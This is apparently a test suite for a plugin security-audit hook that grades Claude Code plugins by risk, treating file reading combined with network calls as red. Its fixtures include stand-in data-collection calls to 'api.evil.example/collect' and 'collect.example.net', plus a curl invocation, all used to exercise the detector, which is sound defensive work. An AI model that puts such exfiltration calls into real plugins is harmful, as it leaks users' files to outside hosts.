import { test, expect, mock } from 'claude-code/testing'

import { assess, parseCalls, parseTarget, scanSource } from '../hooks/audit'

test('targets: owner/repo, URLs, local folders', async () => {
  expect(parseTarget('jrlprost/claude-code-mods', '/Users/x')).toEqual({ kind: 'github', source: 'https://github.com/jrlprost/claude-code-mods.git' })
  expect(parseTarget('https://gitlab.com/a/b.git', '')).toEqual({ kind: 'url', source: 'https://gitlab.com/a/b.git' })
  expect(parseTarget('~/mods/x', '/Users/x')).toEqual({ kind: 'local', source: '/Users/x/mods/x' })
  expect(parseTarget('not a target', '')).toBe(null)
})

test('the validator calls line becomes a call list', async () => {
  const notes = ['./register.tsx calls: $.clock.now, $.fs.write (via exportReport), $.process.run (via idleSeconds, sample), $.ui.toast']
  expect(parseCalls(notes)).toEqual(['$.clock.now', '$.fs.write', '$.process.run', '$.ui.toast'])
})

test('hosts and programs are found in the source', async () => {
  const src = "await $.http.fetch('https://api.evil.example/collect')\nawait $.process.run(['curl', '-s', url])\nconst docs = 'https://github.com/x'"
  expect(scanSource(src)).toEqual({ hosts: ['api.evil.example', 'github.com'], commands: ['curl'] })
})

test('reading plus network is red, network alone amber, nothing green', async () => {
  expect(assess(['$.fs.read', '$.http.fetch'], ['api.x.io'], [], true).risk).toBe('red')
  expect(assess(['$.http.fetch'], ['api.x.io'], [], true).risk).toBe('amber')
  expect(assess(['$.ui.toast', '$.state.get'], [], [], true).risk).toBe('green')
  expect(assess(['$.ui.toast'], [], [], false).risk).toBe('red')
})

test('/jrmodaudit validates each plugin it finds and reports its risk', async ($, on) => {
  mock.clock(on)
  on('session.start', ($, e) => ({ cwd: e.cwd }))
  on('command.register', () => ({ value: undefined }) as never)
  on('env.get', () => ({ value: '/Users/x' }) as never)
  on('ui.open', () => ({ value: { isPlaced: true } }) as never)
  on('process.run', ($, e) => {
    const argv = (e as unknown as { argv: string[] }).argv
    let stdout = ''
    if (argv[0] === 'find' && argv.includes('*/.claude-plugin/plugin.json')) stdout = '/m/plugins/spy/.claude-plugin/plugin.json\n'
    else if (argv[0] === 'find') stdout = '/m/plugins/spy/hooks/register.ts\n'
    else if (argv[0] === 'claude')
      stdout = JSON.stringify({ success: true, manifest: { errors: [], notes: [] }, contents: [{ errors: [], notes: ['./register.ts calls: $.fs.read, $.http.fetch'] }] })
    return { value: { exitCode: 0, stdout, stderr: '' } } as never
  })
  on('fs.read', ($, e) => {
    const file = (e as unknown as { path: string }).path
    return { value: file.endsWith('plugin.json') ? '{"name":"spy"}' : "await $.http.fetch('https://collect.example.net/x')" } as never
  })
  await $.session.start({ cwd: '/tmp', surface: 'terminal', isInteractive: true })
  const answer = await $.command.run({ command: 'jrmodaudit', args: '/m' } as never)
  expect(JSON.stringify(answer)).toContain('🔴 spy')
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({ plugin: 'jr-mod-audit', surface, component: 'Pane', requestId: 'jr-mod-audit', props: {} } as never)
    expect(await ui.find({ text: /read the code before installing/ } as never)).toBeDefined()
    expect(await ui.find({ text: /collect\.example\.net/ } as never)).toBeDefined()
    await ui.unmount()
  }
})
